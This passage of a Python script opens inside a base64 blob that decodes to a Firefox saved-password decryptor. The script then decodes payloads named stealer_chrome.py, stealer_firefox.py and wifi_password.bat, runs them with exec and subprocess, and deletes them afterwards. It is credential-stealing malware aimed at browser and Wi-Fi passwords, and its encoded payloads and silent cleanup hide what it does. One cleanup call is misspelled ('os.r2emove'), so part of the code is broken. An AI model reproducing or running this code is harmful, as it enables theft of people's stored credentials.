RfYXJndW1lbnQoCiAgICAgICAgIi0tbm8tY3N2LWhlYWRlciIsCiAgICAgICAgYWN0aW9uPSJzdG9yZV9mYWxzZSIsCiAgICAgICAgZGVzdD0iY3N2X2hlYWRlciIsCiAgICAgICAgZGVmYXVsdD1UcnVlLAogICAgICAgIGhlbHA9IkRvIG5vdCBpbmNsdWRlIGEgaGVhZGVyIGluIENTViBvdXRwdXQuIiwKICAgICkKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoCiAgICAgICAgIi0tcGFzcy11c2VybmFtZS1wcmVmaXgiLAogICAgICAgIGFjdGlvbj0ic3RvcmUiLAogICAgICAgIGRlZmF1bHQ9IiIsCiAgICAgICAgaGVscD0oCiAgICAgICAgICAgICJFeHBvcnQgdXNlcm5hbWUgYXMgaXMgKGRlZmF1bHQpLCBvciB3aXRoIHRoZSBwcm92aWRlZCBmb3JtYXQgcHJlZml4LiAiCiAgICAgICAgICAgICJGb3IgaW5zdGFuY2UgJ2xvZ2luOiAnIGZvciBicm93c2VycGFzcy4iCiAgICAgICAgKSwKICAgICkKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoCiAgICAgICAgIi1wIiwKICAgICAgICAiLS1wYXNzLXByZWZpeCIsCiAgICAgICAgYWN0aW9uPSJzdG9yZSIsCiAgICAgICAgZGVmYXVsdD0id2ViIiwKICAgICAgICBoZWxwPSJGb2xkZXIgcHJlZml4IGZvciBleHBvcnQgdG8gcGFzcyBmcm9tIHBhc3N3b3Jkc3RvcmUub3JnIChkZWZhdWx0OiAlKGRlZmF1bHQpcykiLAogICAgKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgKICAgICAgICAiLW0iLAogICAgICAgICItLXBhc3MtY21kIiwKICAgICAgICBhY3Rpb249InN0b3JlIiwKICAgICAgICBkZWZhdWx0PSJwYXNzIiwKICAgICAgICBoZWxwPSJDb21tYW5kL3BhdGggdG8gdXNlIHdoZW4gZXhwb3J0aW5nIHRvIHBhc3MgKGRlZmF1bHQ6ICUoZGVmYXVsdClzKSIsCiAgICApCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KAogICAgICAgICItLXBhc3MtYWx3YXlzLXdpdGgtbG9naW4iLAogICAgICAgIGFjdGlvbj0ic3RvcmVfdHJ1ZSIsCiAgICAgICAgaGVscD0iQWx3YXlzIHNhdmUgYXMgLzxsb2dpbj4gKGRlZmF1bHQ6IG9ubHkgd2hlbiBtdWx0aXBsZSBhY2NvdW50cyBwZXIgZG9tYWluKSIsCiAgICApCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KAogICAgICAgICItbiIsCiAgICAgICAgIi0tbm8taW50ZXJhY3RpdmUiLAogICAgICAgIGFjdGlvbj0ic3RvcmVfZmFsc2UiLAogICAgICAgIGRlc3Q9ImludGVyYWN0aXZlIiwKICAgICAgICBkZWZhdWx0PVRydWUsCiAgICAgICAgaGVscD0iRGlzYWJsZSBpbnRlcmFjdGl2aXR5LiIsCiAgICApCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KAogICAgICAgICItLW5vbi1mYXRhbC1kZWNyeXB0aW9uIiwKICAgICAgICBhY3Rpb249InN0b3JlX3RydWUiLAogICAgICAgIGRlZmF1bHQ9RmFsc2UsCiAgICAgICAgaGVscD0iSWYgc2V0LCBjb3JydXB0ZWQgZW50cmllcyB3aWxsIGJlIHNraXBwZWQgaW5zdGVhZCBvZiBhYm9ydGluZyB0aGUgcHJvY2Vzcy4iLAogICAgKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgKICAgICAgICAiLWMiLAogICAgICAgICItLWNob2ljZSIsCiAgICAgICAgaGVscD0iVGhlIHByb2ZpbGUgdG8gdXNlIChzdGFydHMgd2l0aCAxKS4gSWYgb25seSBvbmUgcHJvZmlsZSwgZGVmYXVsdHMgdG8gdGhhdC4iLAogICAgKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgKICAgICAgICAiLWwiLCAiLS1saXN0IiwgYWN0aW9uPSJzdG9yZV90cnVlIiwgaGVscD0iTGlzdCBwcm9maWxlcyBhbmQgZXhpdC4iCiAgICApCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KAogICAgICAgICItZSIsCiAgICAgICAgIi0tZW5jb2RpbmciLAogICAgICAgIGFjdGlvbj0ic3RvcmUiLAogICAgICAgIGRlZmF1bHQ9REVGQVVMVF9FTkNPRElORywKICAgICAgICBoZWxwPSJPdmVycmlkZSBkZWZhdWx0IGVuY29kaW5nICglKGRlZmF1bHQpcykuIiwKICAgICkKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoCiAgICAgICAgIi12IiwKICAgICAgICAiLS12ZXJib3NlIiwKICAgICAgICBhY3Rpb249ImNvdW50IiwKICAgICAgICBkZWZhdWx0PTAsCiAgICAgICAgaGVscD0iVmVyYm9zaXR5IGxldmVsLiBXYXJuaW5nIG9uIC12diAoaGlnaGVzdCBsZXZlbCkgdXNlciBpbnB1dCB3aWxsIGJlIHByaW50ZWQgb24gc2NyZWVuIiwKICAgICkKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoCiAgICAgICAgIi0tdmVyc2lvbiIsCiAgICAgICAgYWN0aW9uPSJ2ZXJzaW9uIiwKICAgICAgICB2ZXJzaW9uPV9fdmVyc2lvbl9fLAogICAgICAgIGhlbHA9IkRpc3BsYXkgdmVyc2lvbiBvZiBmaXJlZm94X2RlY3J5cHQgYW5kIGV4aXQiLAogICAgKQoKICAgIGFyZ3MgPSBwYXJzZXIucGFyc2VfYXJncygpCgogICAgIyB1bmRlcnN0YW5kIGBcdGAgYXMgdGFiIGNoYXJhY3RlciBpZiBzcGVjaWZpZWQgYXMgZGVsaW1pdGVyLgogICAgaWYgYXJncy5jc3ZfZGVsaW1pdGVyID09ICJcXHQiOgogICAgICAgIGFyZ3MuY3N2X2RlbGltaXRlciA9ICJcdCIKCiAgICByZXR1cm4gYXJncwoKCmRlZiBzZXR1cF9sb2dnaW5nKGFyZ3MpIC0+IE5vbmU6CiAgICAiIiJTZXR1cCB0aGUgbG9nZ2luZyBsZXZlbCBhbmQgY29uZmlndXJlIHRoZSBiYXNpYyBsb2dnZXIiIiIKICAgIGlmIGFyZ3MudmVyYm9zZSA9PSAxOgogICAgICAgIGxldmVsID0gbG9nZ2luZy5JTkZPCiAgICBlbGlmIGFyZ3MudmVyYm9zZSA+PSAyOgogICAgICAgIGxldmVsID0gbG9nZ2luZy5ERUJVRwogICAgZWxzZToKICAgICAgICBsZXZlbCA9IGxvZ2dpbmcuV0FSTgoKICAgIGxvZ2dpbmcuYmFzaWNDb25maWcoCiAgICAgICAgZm9ybWF0PSIlKGFzY3RpbWUpcyAtICUobGV2ZWxuYW1lKXMgLSAlKG1lc3NhZ2UpcyIsCiAgICAgICAgbGV2ZWw9bGV2ZWwsCiAgICApCgogICAgZ2xvYmFsIExPRwogICAgTE9HID0gbG9nZ2luZy5nZXRMb2dnZXIoX19uYW1lX18pCgoKZGVmIGlkZW50aWZ5X3N5c3RlbV9sb2NhbGUoKSAtPiBzdHI6CiAgICBlbmNvZGluZzogT3B0aW9uYWxbc3RyXSA9IGxvY2FsZS5nZXRwcmVmZXJyZWRlbmNvZGluZygpCgogICAgaWYgZW5jb2RpbmcgaXMgTm9uZToKICAgICAgICBMT0cuZXJyb3IoCiAgICAgICAgICAgICJDb3VsZCBub3QgZGV0ZXJtaW5lIHdoaWNoIGVuY29kaW5nL2xvY2FsZSB0byB1c2UgZm9yIE5TUyBpbnRlcmFjdGlvbi4gIgogICAgICAgICAgICAiVGhpcyBjb25maWd1cmF0aW9uIGlzIHVuc3VwcG9ydGVkLlxuIgogICAgICAgICAgICAiSWYgeW91IGFyZSBpbiBMaW51eCBvciBNYWNPUywgcGxlYXNlIHNlYXJjaCBvbmxpbmUgIgogICAgICAgICAgICAiaG93IHRvIGNvbmZpZ3VyZSBhIFVURi04IGNvbXBhdGlibGUgbG9jYWxlIGFuZCB0cnkgYWdhaW4uIgogICAgICAgICkKICAgICAgICByYWlzZSBFeGl0KEV4aXQuQkFEX0xPQ0FMRSkKCiAgICByZXR1cm4gZW5jb2RpbmcKCgpkZWYgbWFpbigpIC0+IE5vbmU6CiAgICAiIiJNYWluIGVudHJ5IHBvaW50IiIiCiAgICBhcmdzID0gcGFyc2Vfc3lzX2FyZ3MoKQoKICAgIHNldHVwX2xvZ2dpbmcoYXJncykKCiAgICBnbG9iYWwgREVGQVVMVF9FTkNPRElORwoKICAgIGlmIGFyZ3MuZW5jb2RpbmcgIT0gREVGQVVMVF9FTkNPRElORzoKICAgICAgICBMT0cuaW5mbygKICAgICAgICAgICAgIk92ZXJyaWRpbmcgZGVmYXVsdCBlbmNvZGluZyBmcm9tICclcycgdG8gJyVzJyIsCiAgICAgICAgICAgIERFRkFVTFRfRU5DT0RJTkcsCiAgICAgICAgICAgIGFyZ3MuZW5jb2RpbmcsCiAgICAgICAgKQoKICAgICAgICAjIE92ZXJyaWRlIGRlZmF1bHQgZW5jb2RpbmcgaWYgc3BlY2lmaWVkIGJ5IHVzZXIKICAgICAgICBERUZBVUxUX0VOQ09ESU5HID0gYXJncy5lbmNvZGluZwoKICAgIExPRy5pbmZvKCJSdW5uaW5nIGZpcmVmb3hfZGVjcnlwdCB2ZXJzaW9uOiAlcyIsIF9fdmVyc2lvbl9fKQogICAgTE9HLmRlYnVnKCJQYXJzZWQgY29tbWFuZGxpbmUgYXJndW1lbnRzOiAlcyIsIGFyZ3MpCiAgICBlbmNvZGluZ3MgPSAoCiAgICAgICAgKCJzdGRpbiIsIHN5cy5zdGRpbi5lbmNvZGluZyksCiAgICAgICAgKCJzdGRvdXQiLCBzeXMuc3Rkb3V0LmVuY29kaW5nKSwKICAgICAgICAoInN0ZGVyciIsIHN5cy5zdGRlcnIuZW5jb2RpbmcpLAogICAgICAgICgibG9jYWxlIiwgaWRlbnRpZnlfc3lzdGVtX2xvY2FsZSgpKSwKICAgICkKCiAgICBMT0cuZGVidWcoCiAgICAgICAgIlJ1bm5pbmcgd2l0aCBlbmNvZGluZ3M6ICVzOiAlcywgJXM6ICVzLCAlczogJXMsICVzOiAlcyIsICpjaGFpbigqZW5jb2RpbmdzKQogICAgKQoKICAgIGZvciBzdHJlYW0sIGVuY29kaW5nIGluIGVuY29kaW5nczoKICAgICAgICBpZiBlbmNvZGluZy5sb3dlcigpICE9IERFRkFVTFRfRU5DT0RJTkc6CiAgICAgICAgICAgIExPRy53YXJuaW5nKAogICAgICAgICAgICAgICAgIlJ1bm5pbmcgd2l0aCB1bnN1cHBvcnRlZCBlbmNvZGluZyAnJXMnOiAlcyIKICAgICAgICAgICAgICAgICIgLSBUaGluZ3MgYXJlIGxpa2VseSB0byBmYWlsIGZyb20gaGVyZSBvbndhcmRzIiwKICAgICAgICAgICAgICAgIHN0cmVhbSwKICAgICAgICAgICAgICAgIGVuY29kaW5nLAogICAgICAgICAgICApCgogICAgIyBMb2FkIE1vemlsbGEgcHJvZmlsZSBhbmQgaW5pdGlhbGl6ZSBOU1MgYmVmb3JlIGFza2luZyB0aGUgdXNlciBmb3IgaW5wdXQKICAgIG1veiA9IE1vemlsbGFJbnRlcmFjdGlvbihhcmdzLm5vbl9mYXRhbF9kZWNyeXB0aW9uKQoKICAgIGJhc2VwYXRoID0gb3MucGF0aC5leHBhbmR1c2VyKGFyZ3MucHJvZmlsZSkKCiAgICAjIFJlYWQgcHJvZmlsZXMgZnJvbSBwcm9maWxlcy5pbmkgaW4gcHJvZmlsZSBmb2xkZXIKICAgIHByb2ZpbGUgPSBnZXRfcHJvZmlsZShiYXNlcGF0aCwgYXJncy5pbnRlcmFjdGl2ZSwgYXJncy5jaG9pY2UsIGFyZ3MubGlzdCkKCiAgICAjIFN0YXJ0IE5TUyBmb3Igc2VsZWN0ZWQgcHJvZmlsZQogICAgbW96LmxvYWRfcHJvZmlsZShwcm9maWxlKQogICAgIyBDaGVjayBpZiBwcm9maWxlIGlzIHBhc3N3b3JkIHByb3RlY3RlZCBhbmQgcHJvbXB0IGZvciBhIHBhc3N3b3JkCiAgICBtb3ouYXV0aGVudGljYXRlKGFyZ3MuaW50ZXJhY3RpdmUpCiAgICAjIERlY29kZSBhbGwgcGFzc3dvcmRzCiAgICBvdXRwdXRzID0gbW96LmRlY3J5cHRfcGFzc3dvcmRzKCkKCiAgICAjIEV4cG9ydCBwYXNzd29yZHMgaW50byBvbmUgb2YgbWFueSBmb3JtYXRzCiAgICBmb3JtYXR0ZXIgPSBhcmdzLmZvcm1hdChvdXRwdXRzLCBhcmdzKQogICAgZm9ybWF0dGVyLm91dHB1dCgpCgogICAgIyBGaW5hbGx5IHNodXRkb3duIE5TUwogICAgbW96LnVubG9hZF9wcm9maWxlKCkKCgpkZWYgcnVuX2ZmZGVjcnlwdCgpOgogICAgdHJ5OgogICAgIC
AgIG1haW4oKQogICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgICAgIHByaW50KCJRdWl0LiIpCiAgICAgICAgc3lzLmV4aXQoRXhpdC5LRVlCT0FSRF9JTlRFUlJVUFQpCiAgICBleGNlcHQgRXhpdCBhcyBlOgogICAgICAgIHN5cy5leGl0KGUuZXhpdGNvZGUpCgoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIHJ1bl9mZmRlY3J5cHQoKQ==
"""
decoded = None

decoded = base64.b64decode(chrome_password).decode('ascii')
with open('stealer_chrome.py', 'w') as file:
    file.write(decoded)

exec(open('stealer_chrome.py').read())

decoded = None

decoded = base64.b64decode(firefox_password).decode('ascii')
with open('stealer_firefox.py', 'w') as file:
    file.write(decoded)

exec(open('stealer_firefox.py').read())

decoded = None

decoded = base64.b64decode(wifi_password).decode('ascii')
with open('wifi_password.bat', 'w') as file:
    file.write(decoded)

subprocess.run(r'wifi_password.bat')


os.r2emove('stealer_chrome.py')
os.remove('stealer_firefox.py')
os.remove('wifi_password.bat')
